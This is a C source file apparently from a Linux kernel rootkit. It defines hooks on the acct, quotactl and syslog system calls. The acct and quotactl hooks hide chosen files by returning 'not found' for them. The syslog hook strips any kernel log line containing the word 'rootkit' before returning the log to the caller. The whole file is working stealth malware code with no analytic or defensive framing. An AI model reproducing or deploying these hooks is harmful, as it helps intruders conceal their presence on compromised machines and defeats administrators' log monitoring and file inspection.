#include "files.h"
#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/quota.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_acct syscall hook handler
SYSCALL_HOOK_HANDLER1(acct, orig_acct, p_regs, const char __user *, s_name)
{
    pr_dev_info("acct(%p)\n", s_name);

    if (s_name == NULL) {
        return orig_acct(p_regs);
    }

    return do_check_hidden(orig_acct, p_regs, AT_FDCWD, s_name, 0);
}

// sys_quotactl syscall hook handler
SYSCALL_HOOK_HANDLER4(quotactl, orig_quotactl, p_regs, unsigned int, ui32_cmd, const char __user *,
                      s_special, qid_t, ui32_id, void __user *, p_addr)
{
    uint ui32_cmds = ui32_cmd >> SUBCMDSHIFT;
    uint ui32_type = ui32_cmd & SUBCMDMASK;

    pr_dev_info("quotactl(%#x, %p, %u, %p)\n", ui32_cmd, s_special, ui32_id, p_addr);

    if (ui32_type >= MAXQUOTAS) {
        return -EINVAL;
    }

    if (s_special == NULL) {
        return orig_quotactl(p_regs);
    }

    if (ui32_cmds == Q_QUOTAON) {
        IF_U (is_pathname_hidden(AT_FDCWD, (const char *)p_addr, LOOKUP_FOLLOW)) {
            return -ENOENT;
        }
    }

    return do_check_hidden(orig_quotactl, p_regs, AT_FDCWD, s_special, 0);
}

// sys_syslog syscall hook handler
SYSCALL_HOOK_HANDLER3(syslog, orig_syslog, p_regs, int, i32_type, char __user *, s_buf, int,
                      i32_len)
{
    long i64_ret = 0;

    pr_dev_info("syslog(%d, %p, %d)\n", i32_type, s_buf, i32_len);

    if (s_buf == NULL) {
        return orig_syslog(p_regs);
    }

    i64_ret = orig_syslog(p_regs);

    if (i64_ret > 0) {
        i64_ret = hide_lines(s_buf, i64_ret, "rootkit");
    }

    return i64_ret;
}
